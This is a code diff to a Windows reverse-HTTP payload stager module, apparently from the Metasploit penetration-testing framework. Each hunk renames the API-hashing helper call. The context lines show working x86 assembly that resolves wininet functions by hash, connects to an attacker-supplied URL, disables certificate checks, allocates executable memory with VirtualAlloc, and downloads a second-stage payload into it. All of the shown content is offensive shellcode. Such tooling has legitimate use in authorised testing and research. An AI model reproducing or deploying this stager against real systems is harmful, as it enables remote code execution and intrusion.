@@ -246,7 +246,7 @@ module Payload::Windows::ReverseHttp
         push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
         push 0x696e6977        ; ...
         push esp               ; Push a pointer to the "wininet" string on the stack.
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+        push #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call ebp               ; LoadLibraryA( "wininet" )
         xor ebx, ebx           ; Set ebx to NULL to use in future arguments
     ^
@@ -285,7 +285,7 @@ module Payload::Windows::ReverseHttp
       ^
     end
     asm << %Q^
-      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
+      push #{block_api_hash('wininet.dll', 'InternetOpenA')}
       call ebp
     ^
 
@@ -302,7 +302,7 @@ module Payload::Windows::ReverseHttp
         db "#{opts[:url]}", 0x00
       got_server_host:
         push eax               ; HINTERNET hInternet (still in eax from InternetOpenA)
-        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}
+        push #{block_api_hash('wininet.dll', 'InternetConnectA')}
         call ebp
         mov esi, eax           ; Store hConnection in esi
     ^
@@ -321,7 +321,7 @@ module Payload::Windows::ReverseHttp
                              ; LPVOID lpBuffer (username from previous call)
         push 43              ; DWORD dwOption (INTERNET_OPTION_PROXY_USERNAME)
         push esi             ; hConnection
-        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
+        push #{block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call ebp
       ^
     end
@@ -337,7 +337,7 @@ module Payload::Windows::ReverseHttp
                              ; LPVOID lpBuffer (password from previous call)
         push 44              ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
         push esi             ; hConnection
-        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
+        push #{block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call ebp
       ^
     end
@@ -352,7 +352,7 @@ module Payload::Windows::ReverseHttp
         push edi               ; server URI
         push ebx               ; method
         push esi               ; hConnection
-        push #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}
+        push #{block_api_hash('wininet.dll', 'HttpOpenRequestA')}
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
      ^
@@ -379,7 +379,7 @@ module Payload::Windows::ReverseHttp
         push eax               ; &dwFlags
         push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
         push esi               ; hHttpRequest
-        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
+        push #{block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call ebp
       ^
     end
@@ -406,14 +406,14 @@ module Payload::Windows::ReverseHttp
 
     asm << %Q^
         push esi               ; hHttpRequest
-        push #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}
+        push #{block_api_hash('wininet.dll', 'HttpSendRequestA')}
         call ebp
         test eax,eax
         jnz allocate_memory
 
      set_wait:
         push #{retry_wait}     ; dwMilliseconds
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
+        push #{block_api_hash('kernel32.dll', 'Sleep')}
         call ebp               ; Sleep( dwMilliseconds );
       ^
 
@@ -442,7 +442,7 @@ module Payload::Windows::ReverseHttp
     else
       asm << %Q^
     failure:
-      push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
+      push #{block_api_hash('kernel32.dll', 'ExitProcess')}
       call ebp
       ^
     end
@@ -459,7 +459,7 @@ module Payload::Windows::ReverseHttp
       push 4                 ; bytes to read
       push eax               ; &stage size
       push esi               ; hRequest
-      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
+      push #{block_api_hash('wininet.dll', 'InternetReadFile')}
       call ebp               ; InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead)
       pop ebx                ; bytesRead (unused, pop for cleaning)
       pop ebx                ; stage size
@@ -470,7 +470,7 @@ module Payload::Windows::ReverseHttp
       push 0x1000            ; MEM_COMMIT
       push ebx               ; Stage allocation
       push eax               ; NULL as we dont care where the allocation is
-      push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+      push #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
       call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
     download_prep:
       xchg eax, ebx          ; place the allocated base address in ebx
@@ -482,7 +482,7 @@ module Payload::Windows::ReverseHttp
       push eax               ; read length
       push ebx               ; buffer
       push esi               ; hRequest
-      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
+      push #{block_api_hash('wininet.dll', 'InternetReadFile')}
       call ebp
       test eax,eax           ; download failed? (optional?)
       jz failure
@@ -495,7 +495,7 @@ module Payload::Windows::ReverseHttp
       push 0x1000            ; MEM_COMMIT
       push 0x00400000        ; Stage allocation (4Mb ought to do us)
       push ebx               ; NULL as we dont care where the allocation is
-      push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+      push #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
       call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
     download_prep:
@@ -509,7 +509,7 @@ module Payload::Windows::ReverseHttp
       push 8192              ; read length
       push ebx               ; buffer
       push esi               ; hRequest
-      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
+      push #{block_api_hash('wininet.dll', 'InternetReadFile')}
       call ebp
 
       test eax,eax           ; download failed? (optional?)
